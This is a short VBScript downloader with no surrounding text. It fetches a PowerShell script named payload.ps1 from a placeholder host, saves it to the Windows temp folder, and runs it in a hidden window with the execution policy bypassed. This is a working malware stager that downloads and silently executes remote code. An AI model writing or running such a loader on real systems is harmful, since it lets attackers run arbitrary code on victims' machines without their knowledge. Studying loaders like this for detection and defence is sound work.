Set objXML = CreateObject("Microsoft.XMLHTTP")
objXML.Open "GET", "http://IP/payload.ps1", False 
objXML.Send

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(objFSO.GetSpecialFolder(2) & "\temp.ps1", True)
objFile.Write objXML.ResponseText
objFile.Close

Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File " & objFSO.GetSpecialFolder(2) & "\temp.ps1", 0
